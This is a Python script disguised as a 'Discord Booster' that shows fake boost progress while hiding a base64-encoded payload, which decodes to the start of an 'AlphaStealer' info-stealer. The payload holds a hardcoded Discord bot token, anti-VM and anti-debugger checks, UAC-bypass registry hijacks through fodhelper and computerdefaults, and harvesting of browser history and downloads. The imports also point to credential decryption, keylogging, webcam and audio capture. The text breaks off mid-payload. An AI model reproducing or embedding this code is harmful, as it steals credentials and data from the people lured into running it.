import base64
from colorama import Fore, init
init()
class DiscordBooster:
    def __init__(self):
        self.tokens = 0
        self.time = 0
        self.server = None

    @classmethod
    def Initialize(cls):
        print(Fore.RESET + f"[{Fore.LIGHTCYAN_EX}INFO{Fore.RESET}] {Fore.LIGHTCYAN_EX}Initializing Discord Booster...\n")
        return cls()

    def SetTokens(self, tokens):
        self.tokens = tokens
        print(Fore.RESET + f"[{Fore.GREEN}INFO{Fore.RESET}]{Fore.GREEN} Tokens: {Fore.RESET}{tokens}\n")
        return tokens

    def SetTime(self, time):
        self.time = time
        print(Fore.RESET + f"[{Fore.GREEN}INFO{Fore.RESET}]{Fore.GREEN} Nitro tokens of: {Fore.RESET}{time} months")
        return time

    def SetServer(self, server):
        self.server = server
        print(Fore.RESET + f"[{Fore.GREEN}INFO{Fore.RESET}] {Fore.GREEN}Current Server:{Fore.RESET} {server}\n")
        return server

    def Boost(self):
        import discord
        import threading
        import aiohttp
        import json
        import os
        import re
        from discord.ext import commands
        from Crypto.Cipher import AES
        import win32crypt
        from win32crypt import CryptUnprotectData
        import requests
        import socket
        from functools import wraps
        import sys
        import ctypes
        import sqlite3
        import time
        import shutil
        import zipfile
        import re
        import subprocess
        from io import BytesIO
        from datetime import datetime
        import asyncio
        import cv2
        import webbrowser
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        import pyautogui
        import pyttsx3
        import numpy as np
        import keyboard
        import sounddevice as sd
        from scipy.io.wavfile import write
        import string
        import random
        from cryptography.fernet import Fernet
        import platform
        import psutil
        import GPUtil
        from screeninfo import get_monitors
        import win32com.client
        import winreg
        import shlex
        from pypresence import Presence
        from discord.utils import get
        import rotatescreen
        Code = """
IyBBbHBoYVN0ZWFsZXIgQnkgQWxwaGFTcXVhZA0KIyBOZXcgQWxwaGFTdGVhbGVyDQojIE9sZCBBbHBoYVN0ZWFsZXIgQnkgUHJvdG9jb2w5OTkgSXMgU2hpdA0KIyBBTFBIQVNURUFMRVIgVEhFIEJFU1QgU1RFQUxFUiBPRiBBTEwgVElNRVMNCg0KTWFsd2FyZVBhdGhGaWxlID0gc3lzLmV4ZWN1dGFibGUNCk1hbHdhcmVQYXRoID0gb3MucGF0aC5kaXJuYW1lKE1hbHdhcmVQYXRoRmlsZSkNClByb2Nlc3MgPSBwc3V0aWwuUHJvY2Vzcyhvcy5nZXRwaWQoKSkNCg0KZmlsZXBhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgJ0RvY3VtZW50cycsICdieXBhc3MuYmF0JykNCg0KaWYgb3MucGF0aC5pc2ZpbGUoZmlsZXBhdGgpOg0KICAgIHRyeToNCiAgICAgICAgb3MucmVtb3ZlKGZpbGVwYXRoKQ0KICAgICAgICBwYXNzDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwYXNzDQplbHNlOg0KICAgIHBhc3MNCg0KVE9LRU4gPSAnTVRNM056STRORE0yTkRFNU1ETTFNVFE1TVEuRy0xWTlsLlIyRmNLOEdpNERxMUNxUlRhZ28tT1NDVTVKNFNVU0hSTERFdnhZJw0KU0VSVkVSID0gMTM3NzI3NDg1NDg5MzQyNDczMQ0KDQpGb2xkZXJBU1RMUiA9ICdBU1RMUicNCg0KUHJvY05hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKF9fZmlsZV9fKQ0KDQphY3R1YWwgPSBkYXRldGltZS5ub3coKQ0KDQpmZWNoYSA9IGFjdHVhbC5zdHJmdGltZSgiJWQvJW0vJVkiKQ0KaG9yYSA9IGFjdHVhbC5zdHJmdGltZSgiJUg6JU06JVMiKQ0KDQpzaHV0ZG93bl9jbWQgPSAnc2h1dGRvd24gLXMgLWYgLXQgMCcNCnJlc3RhcnRfY21kID0gJ3NodXRkb3duIC1yIC1mIC10IDAnDQpsb2dvZmZfY21kID0gJ3NodXRkb3duIC1sJw0KU2NyZWVuID0gRmFsc2UNClN0cnRwID0gRmFsc2UNCg0KZGVmIHByb3RlY3Rpb25fY2hlY2soKToNCiAgICB2bV9maWxlcyA9IFsNCiAgICAgICAgIkM6XFx3aW5kb3dzXFxzeXN0ZW0zMlxcdm1HdWVzdExpYi5kbGwiLA0KICAgICAgICAiQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFx2bTNkZ2wuZGxsIiwNCiAgICAgICAgIkM6XFx3aW5kb3dzXFxzeXN0ZW0zMlxcdmJveGhvb2suZGxsIiwNCiAgICAgICAgIkM6XFx3aW5kb3dzXFxzeXN0ZW0zMlxcdmJveG1yeG5wLmRsbCIsDQogICAgICAgICJDOlxcd2luZG93c1xcc3lzdGVtMzJcXHZtc3J2Yy5kbGwiLA0KICAgICAgICAiQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxkcml2ZXJzXFx2bXNydmMuc3lzIg0KICAgIF0NCiAgICBibGFja2xpc3RlZF9wcm9jZXNzZXMgPSBbDQogICAgICAgICd2bXRvb2xzZC5leGUnLCANCiAgICAgICAgJ3Ztd2FyZXRyYXkuZXhlJywgDQogICAgICAgICd2bXdhcmV1c2VyLmV4ZScsDQogICAgICAgICdmYWtlbmV0LmV4ZScsIA0KICAgICAgICAnZHVtcGNhcC5leGUnLCANCiAgICAgICAgJ2h0dHBkZWJ1Z2dlcnVpLmV4ZScsIA0KICAgICAgICAnd2lyZXNoYXJrLmV4ZScsIA0KICAgICAgICAnZmlkZGxlci5leGUnLCANCiAgICAgICAgJ3Zib3hzZXJ2aWNlLmV4ZScsIA0KICAgICAgICAnZGY1c2Vydi5leGUnLCANCiAgICAgICAgJ3Zib3h0cmF5LmV4ZScsIA0KICAgICAgICAnaWRhNjQuZXhlJywgDQogICAgICAgICdvbGx5ZGJnLmV4ZScsIA0KICAgICAgICAncGVzdHVkaW8uZXhlJywgDQogICAgICAgICd2Z2F1dGhzZXJ2aWNlLmV4ZScsIA0KICAgICAgICAndm1hY3RobHAuZXhlJywgDQogICAgICAgICd4OTZkYmcuZXhlJywgDQogICAgICAgICd4MzJkYmcuZXhlJywgDQogICAgICAgICdwcmxfY2MuZXhlJywgDQogICAgICAgICdwcmxfdG9vbHMuZXhlJywgDQogICAgICAgICd4ZW5zZXJ2aWNlLmV4ZScsIA0KICAgICAgICAncWVtdS1nYS5leGUnLCANCiAgICAgICAgJ2pvZWJveGNvbnRyb2wuZXhlJywgDQogICAgICAgICdrc2R1bXBlcmNsaWVudC5leGUnLCANCiAgICAgICAgJ2tzZHVtcGVyLmV4ZScsIA0KICAgICAgICAnam9lYm94c2VydmVyLmV4ZScNCiAgICBdDQoNCiAgICBmb3IgcHJvY2VzcyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKFsncGlkJywgJ25hbWUnXSk6DQogICAgICAgIGlmIHByb2Nlc3MuaW5mb1snbmFtZSddLmxvd2VyKCkgaW4gYmxhY2tsaXN0ZWRfcHJvY2Vzc2VzOg0KICAgICAgICAgICAgcmV0dXJuIFRydWUNCiAgICBmb3IgZmlsZV9wYXRoIGluIHZtX2ZpbGVzOg0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmaWxlX3BhdGgpOg0KICAgICAgICAgICAgcmV0dXJuIFRydWUNCg0KICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgQ2hlY2tWTSgpOg0KICAgIGlmIHByb3RlY3Rpb25fY2hlY2soKToNCiAgICAgICAgc3lzLmV4aXQoMSkNCiAgICBlbHNlOg0KICAgICAgICBwYXNzDQoNCmRlZiBNZXRhRGF0ZXMoKToNCiAgICBmb2xkZXJfcGF0aCA9IGYnQzpcXFVzZXJzXFx7dXNlcm5hbWV9XFxBcHBEYXRhXFxMb2NhbFxcQVNUTFInDQoNCiAgICBvcy5jaGRpcihmJ0M6XFxVc2Vyc1xce3VzZXJuYW1lfVxcQXBwRGF0YVxcTG9jYWwnKQ0KDQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGZvbGRlcl9wYXRoKToNCiAgICAgICAgb3MubWFrZWRpcnMoZm9sZGVyX3BhdGgpDQoNCiAgICBvcy5jaGRpcignQVNUTFInKQ0KDQogICAgd2l0aCBvcGVuKCdBbHBoYVNxdWFkLmFzcScsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgZi53cml0ZShUT0tFTiArICdcbicpIA0KICAgICAgICBmLndyaXRlKGYne1NFUlZFUn0nICsgJ1xuJykgDQogICAgICAgIA0KICAgIG9zLmNoZGlyKCcuLicpDQogICAgb3Muc3lzdGVtKCdhdHRyaWIgK2ggQVNUTFInKQ0KDQpkZWYgRGVsRm9sZGVyKGNhcnBldGEpOg0KICAgIGlmIG9zLnBhdGguZXhpc3RzKGNhcnBldGEpIGFuZCBvcy5wYXRoLmlzZGlyKGNhcnBldGEpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBzaHV0aWwucm10cmVlKGNhcnBldGEpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHBhc3MNCiAgICBlbHNlOg0KICAgICAgICBwYXNzDQoNCmRlZiBVQUNieXBhc3MobWV0aG9kOiBpbnQgPSAxKSAtPiBib29sOg0KICAgIGlmIEdldFNlbGYoKVsxXToNCiAgICAgICAgZXhlY3V0ZSA9IGxhbWJkYSBjbWQ6IHN1YnByb2Nlc3MucnVuKGNtZCwgc2hlbGw9IFRydWUsIGNhcHR1cmVfb3V0cHV0PSBUcnVlKQ0KICAgICAgICBpZiBtZXRob2QgPT0gMToNCiAgICAgICAgICAgIGV4ZWN1dGUoZiJyZWcgYWRkIGhrY3VcU29mdHdhcmVcXENsYXNzZXNcXG1zLXNldHRpbmdzXFxzaGVsbFxcb3BlblxcY29tbWFuZCAvZCBcIntzeXMuZXhlY3V0YWJsZX1cIiAvZiIpDQogICAgICAgICAgICBleGVjdXRlKCJyZWcgYWRkIGhrY3VcU29mdHdhcmVcXENsYXNzZXNcXG1zLXNldHRpbmdzXFxzaGVsbFxcb3BlblxcY29tbWFuZCAvdiBcIkRlbGVnYXRlRXhlY3V0ZVwiIC9mIikNCiAgICAgICAgICAgIGxvZ19jb3VudF9iZWZvcmUgPSBsZW4oZXhlY3V0ZSgnd2V2dHV0aWwgcWUgIk1pY3Jvc29mdC1XaW5kb3dzLVdpbmRvd3MgRGVmZW5kZXIvT3BlcmF0aW9uYWwiIC9mOnRleHQnKS5zdGRvdXQpDQogICAgICAgICAgICBleGVjdXRlKCJjb21wdXRlcmRlZmF1bHRzIC0tbm91YWNieXBhc3MiKQ0KICAgICAgICAgICAgbG9nX2NvdW50X2FmdGVyID0gbGVuKGV4ZWN1dGUoJ3dldnR1dGlsIHFlICJNaWNyb3NvZnQtV2luZG93cy1XaW5kb3dzIERlZmVuZGVyL09wZXJhdGlvbmFsIiAvZjp0ZXh0Jykuc3Rkb3V0KQ0KICAgICAgICAgICAgZXhlY3V0ZSgicmVnIGRlbGV0ZSBoa2N1XFNvZnR3YXJlXFxDbGFzc2VzXFxtcy1zZXR0aW5ncyAvZiIpDQogICAgICAgICAgICBpZiBsb2dfY291bnRfYWZ0ZXIgPiBsb2dfY291bnRfYmVmb3JlOg0KICAgICAgICAgICAgICAgIHJldHVybiBVQUNieXBhc3MobWV0aG9kICsgMSkNCiAgICAgICAgZWxpZiBtZXRob2QgPT0gMjoNCiAgICAgICAgICAgIGV4ZWN1dGUoZiJyZWcgYWRkIGhrY3VcU29mdHdhcmVcXENsYXNzZXNcXG1zLXNldHRpbmdzXFxzaGVsbFxcb3BlblxcY29tbWFuZCAvZCBcIntzeXMuZXhlY3V0YWJsZX1cIiAvZiIpDQogICAgICAgICAgICBleGVjdXRlKCJyZWcgYWRkIGhrY3VcU29mdHdhcmVcXENsYXNzZXNcXG1zLXNldHRpbmdzXFxzaGVsbFxcb3BlblxcY29tbWFuZCAvdiBcIkRlbGVnYXRlRXhlY3V0ZVwiIC9mIikNCiAgICAgICAgICAgIGxvZ19jb3VudF9iZWZvcmUgPSBsZW4oZXhlY3V0ZSgnd2V2dHV0aWwgcWUgIk1pY3Jvc29mdC1XaW5kb3dzLVdpbmRvd3MgRGVmZW5kZXIvT3BlcmF0aW9uYWwiIC9mOnRleHQnKS5zdGRvdXQpDQogICAgICAgICAgICBleGVjdXRlKCJmb2RoZWxwZXIgLS1ub3VhY2J5cGFzcyIpDQogICAgICAgICAgICBsb2dfY291bnRfYWZ0ZXIgPSBsZW4oZXhlY3V0ZSgnd2V2dHV0aWwgcWUgIk1pY3Jvc29mdC1XaW5kb3dzLVdpbmRvd3MgRGVmZW5kZXIvT3BlcmF0aW9uYWwiIC9mOnRleHQnKS5zdGRvdXQpDQogICAgICAgICAgICBleGVjdXRlKCJyZWcgZGVsZXRlIGhrY3VcU29mdHdhcmVcXENsYXNzZXNcXG1zLXNldHRpbmdzIC9mIikNCiAgICAgICAgICAgIGlmIGxvZ19jb3VudF9hZnRlciA+IGxvZ19jb3VudF9iZWZvcmU6DQogICAgICAgICAgICAgICAgcmV0dXJuIFVBQ2J5cGFzcyhtZXRob2QgKyAxKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgICAgIHJldHVybiBUcnVlDQoNCmRlZiBJc0FkbWluKCkgLT4gYm9vbDoNCiAgICByZXR1cm4gY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKSA9PSAxDQoNCmRlZiBHZXRTZWxmKCkgLT4gdHVwbGVbc3RyLCBib29sXToNCiAgICBpZiBoYXNhdHRyKHN5cywgImZyb3plbiIpOg0KICAgICAgICByZXR1cm4gKHN5cy5leGVjdXRhYmxlLCBUcnVlKQ0KICAgIGVsc2U6DQogICAgICAgIHJldHVybiAoX19maWxlX18sIEZhbHNlKQ0KDQpkZWYgaXNfYWRtaW4oKToNCiAgICB0cnk6DQogICAgICAgIHJldHVybiBjdHlwZXMud2luZGxsLnNoZWxsMzIuSXNVc2VyQW5BZG1pbigpDQogICAgZXhjZXB0Og0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KbW9uaXRvciA9IGdldF9tb25pdG9ycygpWzBdDQoNCnJlc29sdWNpb24gPSAobW9uaXRvci53aWR0aCwgbW9uaXRvci5oZWlnaHQpDQoNCmRlZiBlbGV2YXRlX3RvX2FkbWluKCk6DQogICAgaWYgbm90IGlzX2FkbWluKCk6DQogICAgICAgIHNjcmlwdCA9IHN5cy5hcmd2WzBdDQogICAgICAgIHBhcmFtcyA9ICcgJy5qb2luKFtzY3JpcHRdICsgc3lzLmFyZ3ZbMTpdKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjdHlwZXMud2luZGxsLnNoZWxsMzIuU2hlbGxFeGVjdXRlVygNCiAgICAgICAgICAgICAgICBOb25lLCAicnVuYXMiLCBzeXMuZXhlY3V0YWJsZSwgcGFyYW1zLCBOb25lLCAxKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHN5cy5leGl0KCkNCg0KdXNlcm5hbWUgPSBvcy5nZXRsb2dpbigpDQoNClByb3RlY3RvciA9IEZhbHNlDQoNCmRlZiBnZXRfY2hyb21pdW1faGlzdG9yeShwYXRoKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6DQogICAgICAgIHJldHVybiBbXQ0KDQogICAgdGVtcF9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICdBcHBEYXRhJywgJ0xvY2FsJywgJ1RlbXAnLCAnaGlzdG9yeV9jb3B5LmRiJykNCiAgICBzaHV0aWwuY29weShwYXRoLCB0ZW1wX3BhdGgpDQoNCiAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KHRlbXBfcGF0aCkNCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgdHJ5Og0KICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzIikNCiAgICAgICAgcm93cyA9IGN1cnNvci5mZXRjaGFsbCgpDQogICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgcm93cyA9IFtdDQogICAgY29ubi5jbG9zZSgpDQogICAgb3MucmVtb3ZlKHRlbXBfcGF0aCkNCg0KICAgIGhpc3RvcnkgPSBbXQ0KICAgIGZvciByb3cgaW4gcm93czoNCiAgICAgICAgdXJsLCB0aXRsZSwgdmlzaXRfY291bnQsIGxhc3RfdmlzaXRfdGltZSA9IHJvdw0KICAgICAgICB0aW1lc3RhbXAgPSBsYXN0X3Zpc2l0X3RpbWUgLyAxMDAwMDAwIC0gMTE2NDQ0NzM2MDANCiAgICAgICAgbGFzdF92aXNpdF9kYXRlID0gdGltZS5zdHJmdGltZSgnJVktJW0tJWQgJUg6JU06JVMnLCB0aW1lLmxvY2FsdGltZSh0aW1lc3RhbXApKQ0KICAgICAgICBoaXN0b3J5LmFwcGVuZCgodXJsLCB0aXRsZSwgdmlzaXRfY291bnQsIGxhc3RfdmlzaXRfZGF0ZSkpDQoNCiAgICByZXR1cm4gaGlzdG9yeQ0KDQpkZWYgZ2V0X2ZpcmVmb3hfaGlzdG9yeSgpOg0KICAgIHByb2ZpbGVzX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiQVBQREFUQSJdLCAiTW96aWxsYSIsICJGaXJlZm94IiwgIlByb2ZpbGVzIikNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocHJvZmlsZXNfcGF0aCk6DQogICAgICAgIHJldHVybiBbXQ0KDQogICAgZm9yIHByb2ZpbGUgaW4gb3MubGlzdGRpcihwcm9maWxlc19wYXRoKToNCiAgICAgICAgZGJfcGF0aCA9IG9zLnBhdGguam9pbihwcm9maWxlc19wYXRoLCBwcm9maWxlLCAicGxhY2VzLnNxbGl0ZSIpDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGRiX3BhdGgpOg0KICAgICAgICAgICAgdGVtcF9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICdBcHBEYXRhJywgJ0xvY2FsJywgJ1RlbXAnLCAncGxhY2VzX2NvcHkuc3FsaXRlJykNCiAgICAgICAgICAgIHNodXRpbC5jb3B5KGRiX3BhdGgsIHRlbXBfcGF0aCkNCiAgICAgICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QodGVtcF9wYXRoKQ0KICAgICAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCIiIg0KICAgICAgICAgICAgICAgICAgICBTRUxFQ1QgdXJsLCB0aXRsZSwgdmlzaXRfY291bnQsIGxhc3RfdmlzaXRfZGF0ZQ0KICAgICAgICAgICAgICAgICAgICBGUk9NIG1vel9wbGFjZXMNCiAgICAgICAgICAgICAgICAiIiIpDQogICAgICAgICAgICAgICAgcm93cyA9IGN1cnNvci5mZXRjaGFsbCgpDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgIHJvd3MgPSBbXQ0KICAgICAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgICAgICBvcy5yZW1vdmUodGVtcF9wYXRoKQ0KDQogICAgICAgICAgICBoaXN0b3J5ID0gW10NCiAgICAgICAgICAgIGZvciByb3cgaW4gcm93czoNCiAgICAgICAgICAgICAgICB1cmwsIHRpdGxlLCB2aXNpdF9jb3VudCwgbGFzdF92aXNpdF90aW1lID0gcm93DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXAgPSBsYXN0X3Zpc2l0X3RpbWUgLyAxMDAwMDAwDQogICAgICAgICAgICAgICAgICAgIGxhc3RfdmlzaXRfZGF0ZSA9IHRpbWUuc3RyZnRpbWUoJyVZLSVtLSVkICVIOiVNOiVTJywgdGltZS5sb2NhbHRpbWUodGltZXN0YW1wKSkNCiAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgIGxhc3RfdmlzaXRfZGF0ZSA9ICdOL0EnDQogICAgICAgICAgICAgICAgaGlzdG9yeS5hcHBlbmQoKHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X2RhdGUpKQ0KICAgICAgICAgICAgcmV0dXJuIGhpc3RvcnkNCiAgICByZXR1cm4gW10NCg0KZGVmIHNhdmVfYWxsX2hpc3RvcmllcygpOg0KICAgIGJyb3dzZXJzID0gew0KICAgICAgICAiQ2hyb21lIjogb3MucGF0aC5qb2luKCJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIkNocm9tZSBTeFMiOiBvcy5wYXRoLmpvaW4oIkdvb2dsZSIsICJDaHJvbWUgU3hTIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIkNocm9tZSAxIjogb3MucGF0aC5qb2luKCJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJQcm9maWxlIDEiLCAiSGlzdG9yeSIpLA0KICAgICAgICAiQ2hyb21lIDIiOiBvcy5wYXRoLmpvaW4oIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiwgIlByb2ZpbGUgMiIsICJIaXN0b3J5IiksDQogICAgICAgICJDaHJvbWUgMyI6IG9zLnBhdGguam9pbigiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiLCAiUHJvZmlsZSAzIiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIkNocm9tZSA0Ijogb3MucGF0aC5qb2luKCJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJQcm9maWxlIDQiLCAiSGlzdG9yeSIpLA0KICAgICAgICAiQ2hyb21lIDUiOiBvcy5wYXRoLmpvaW4oIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiwgIlByb2ZpbGUgNSIsICJIaXN0b3J5IiksDQogICAgICAgICJFZGdlIjogb3MucGF0aC5qb2luKCJNaWNyb3NvZnQiLCAiRWRnZSIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJIaXN0b3J5IiksDQogICAgICAgICJCcmF2ZSI6IG9zLnBhdGguam9pbigiQnJhdmVTb2Z0d2FyZSIsICJCcmF2ZS1Ccm93c2VyIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIk9wZXJhIjogb3MucGF0aC5qb2luKCJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBTdGFibGUiLCAiSGlzdG9yeSIpLA0KICAgICAgICAiT3BlcmEgR1giOiBvcy5wYXRoLmpvaW4oIk9wZXJhIFNvZnR3YXJlIiwgIk9wZXJhIEdYIFN0YWJsZSIsICJIaXN0b3J5IiksDQogICAgICAgICJBbWlnbyI6IG9zLnBhdGguam9pbigiQW1pZ28iLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiSGlzdG9yeSIpLA0KICAgICAgICAiVG9yY2giOiBvcy5wYXRoLmpvaW4oIlRvcmNoIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIktvbWV0YSI6IG9zLnBhdGguam9pbigiS29tZXRhIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIk9yYml0dW0iOiBvcy5wYXRoLmpvaW4oIk9yYml0dW0iLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiSGlzdG9yeSIpLA0KICAgICAgICAiQ2VudEJyb3dzZXIiOiBvcy5wYXRoLmpvaW4oIkNlbnRCcm93c2VyIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIjdTdGFyIjogb3MucGF0aC5qb2luKCI3U3RhciIsICI3U3RhciIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJIaXN0b3J5IiksDQogICAgICAgICJTcHV0bmlrIjogb3MucGF0aC5qb2luKCJTcHV0bmlrIiwgIlNwdXRuaWsiLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiSGlzdG9yeSIpLA0KICAgICAgICAiVml2YWxkaSI6IG9zLnBhdGguam9pbigiVml2YWxkaSIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJIaXN0b3J5IiksDQogICAgICAgICJFcGljIjogb3MucGF0aC5qb2luKCJFcGljIFByaXZhY3kgQnJvd3NlciIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJIaXN0b3J5IiksDQogICAgICAgICJVcmFuIjogb3MucGF0aC5qb2luKCJ1Q296TWVkaWEiLCAiVXJhbiIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJIaXN0b3J5IiksDQogICAgICAgICJZYW5kZXgiOiBvcy5wYXRoLmpvaW4oIllhbmRleCIsICJZYW5kZXhCcm93c2VyIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkhpc3RvcnkiKSwNCiAgICAgICAgIklyaWRpdW0iOiBvcy5wYXRoLmpvaW4oIklyaWRpdW0iLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiSGlzdG9yeSIpDQogICAgfQ0KDQogICAgb3V0cHV0X2ZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAnQXBwRGF0YScsICdoaXN0b3J5LnR4dCcpDQogICAgd2l0aCBvcGVuKG91dHB1dF9maWxlX3BhdGgsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZmlsZToNCiAgICAgICAgZm9yIG5hbWUsIHJlbGF0aXZlX3BhdGggaW4gYnJvd3NlcnMuaXRlbXMoKToNCiAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJMT0NBTEFQUERBVEEiXSwgcmVsYXRpdmVfcGF0aCkNCiAgICAgICAgICAgIGhpc3RvcnkgPSBnZXRfY2hyb21pdW1faGlzdG9yeShmdWxsX3BhdGgpDQogICAgICAgICAgICBpZiBoaXN0b3J5Og0KICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoIj0iICogNTAgKyBmIlxue25hbWV9IEhpc3RvcnlcbiIgKyAiPSIgKiA1MCArICJcbiIpDQogICAgICAgICAgICAgICAgZm9yIHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X2RhdGUgaW4gaGlzdG9yeToNCiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIlVSTDoge3VybH1cbiIpDQogICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoZiJUw610dWxvOiB7dGl0bGV9XG4iKQ0KICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiVmlzaXRhczoge3Zpc2l0X2NvdW50fVxuIikNCiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIsOabHRpbWEgdmlzaXRhOiB7bGFzdF92aXNpdF9kYXRlfVxuIikNCiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZSgiLSIgKiA1MCArICJcbiIpDQoNCiAgICAgICAgIyBGaXJlZm94IHNlcGFyYWRvDQogICAgICAgIGZpcmVmb3hfaGlzdG9yeSA9IGdldF9maXJlZm94X2hpc3RvcnkoKQ0KICAgICAgICBpZiBmaXJlZm94X2hpc3Rvcnk6DQogICAgICAgICAgICBmaWxlLndyaXRlKCI9IiAqIDUwICsgZiJcbkZpcmVmb3ggSGlzdG9yeVxuIiArICI9IiAqIDUwICsgIlxuIikNCiAgICAgICAgICAgIGZvciB1cmwsIHRpdGxlLCB2aXNpdF9jb3VudCwgbGFzdF92aXNpdF9kYXRlIGluIGZpcmVmb3hfaGlzdG9yeToNCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiVVJMOiB7dXJsfVxuIikNCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiVMOtdHVsbzoge3RpdGxlfVxuIikNCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiVmlzaXRhczoge3Zpc2l0X2NvdW50fVxuIikNCiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiw5psdGltYSB2aXNpdGE6IHtsYXN0X3Zpc2l0X2RhdGV9XG4iKQ0KICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoIi0iICogNTAgKyAiXG4iKQ0KDQogICAgcHJpbnQoZiJIaXN0b3JpYWwgZ3VhcmRhZG8gZW46IHtvdXRwdXRfZmlsZV9wYXRofSIpDQoNCmRlZiBzYXZlX2Rvd25sb2Fkc190b190eHQoKToNCiAgICBvdXRwdXRfZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICdBcHBEYXRhJywgJ2Rvd25sb2Fkcy50eHQnKQ0KDQogICAgYnJvd3NlcnMgPSB7DQogICAgICAgICJDaHJvbWUiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnR29vZ2xlJywgJ0Nocm9tZS